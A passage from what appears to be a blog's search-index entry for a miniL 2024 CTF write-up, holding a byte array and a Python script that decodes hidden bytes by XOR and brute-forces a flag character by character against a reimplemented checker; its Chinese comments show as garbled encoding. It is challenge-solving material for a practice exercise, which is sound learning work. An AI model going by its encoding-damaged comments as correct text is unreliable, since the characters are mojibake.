0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,20, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 20, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 9, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 5, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 8, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,15, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 70, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 1, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 7, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 10, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,0, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 70, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 3, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 14, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 18, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,70, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 20, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 3, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 17, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 21, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,8, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 7, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 70, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 19, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,246, 0, 0, 0, 9, 0, 0, 0, 246, 0,0, 0, 102, 0, 0, 0, 246, 0, 0, 0,31, 0, 0, 0, 246, 0, 0, 0, 102, 0,0, 0, 246, 0, 0, 0, 70, 0, 0, 0,246, 0, 0, 0, 102, 0, 0, 0, 246, 0,0, 0, 0, 0, 0, 0, 246, 0, 0, 0,102, 0, 0, 0, 246, 0, 0, 0, 47, 0,0, 0, 246, 0, 0, 0, 102, 0, 0, 0,247, 0, 0, 0]</span><br><span class="line"></span><br><span class="line">m=[]</span><br><span class="line">for i in range(4,len(f1),8):</span><br><span class="line">    m.append(f1[i])</span><br><span class="line">for i in reversed(range(0,len(m),2)):</span><br><span class="line">    print(chr(m[i]^m[i-1]),end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">flag=&#x27;mi&#x27;</span><br><span class="line"></span><br><span class="line">a1 = ord(flag[1])</span><br><span class="line">v7 = ord(flag[0])</span><br><span class="line"></span><br><span class="line">p = f.index(244)</span><br><span class="line">print(p)</span><br><span class="line">i = 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def panduan(flag):</span><br><span class="line">    # åˆ¤æ–­flagæ˜¯å¦æ­£ç¡®</span><br><span class="line">    a1 = ord(flag[1])</span><br><span class="line">    v7 = ord(flag[0])</span><br><span class="line"></span><br><span class="line">    p = f.index(244)</span><br><span class="line">    i = 2</span><br><span class="line">    while p &lt;= len(f):</span><br><span class="line"></span><br><span class="line">        # print(v7)</span><br><span class="line">        a1 += f[p + 12]</span><br><span class="line">        a1 %= 256</span><br><span class="line">        # print(a1)</span><br><span class="line">        v7 += f[p + 20]+ f[p + 4]</span><br><span class="line">        v7 %= 256</span><br><span class="line">        # print(v7)</span><br><span class="line">        v7 = v7 ^ a1</span><br><span class="line">        v7 %= 256</span><br><span class="line">        # print(f&quot;&#123;v7&#125;---&#123;f[p+32]&#125;&quot;)</span><br><span class="line">        if i == len(flag):</span><br><span class="line">            if v7 == f[p + 32]:</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                return False</span><br><span class="line">        v7 = a1</span><br><span class="line">        v7 %= 256</span><br><span class="line">        # print(v7)</span><br><span class="line">        try:</span><br><span class="line">            a1 = ord(flag[i])</span><br><span class="line">        except:</span><br><span class="line">            break</span><br><span class="line">        # print(a1)</span><br><span class="line">        i += 1</span><br><span class="line">        p += 56</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(2,45):</span><br><span class="line">    print(f&#x27;æ­£åœ¨çˆ†ç ´ç¬¬&#123;i&#125;ä½å­—ç¬¦...&#x27;)</span><br><span class="line">    for k in range(127):</span><br><span class="line">          # flagæ˜¯ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå¼€å¤´ä¸€å®šæ˜¯mini,é•¿åº¦å¤§æ¦‚44</span><br><span class="line">        if panduan(flag + chr(k)):</span><br><span class="line">            flag += chr(k)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br></pre></td></tr></table></figure><p><img src="/2024/05/10/miniL2024-wp/Image(8).png"></p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
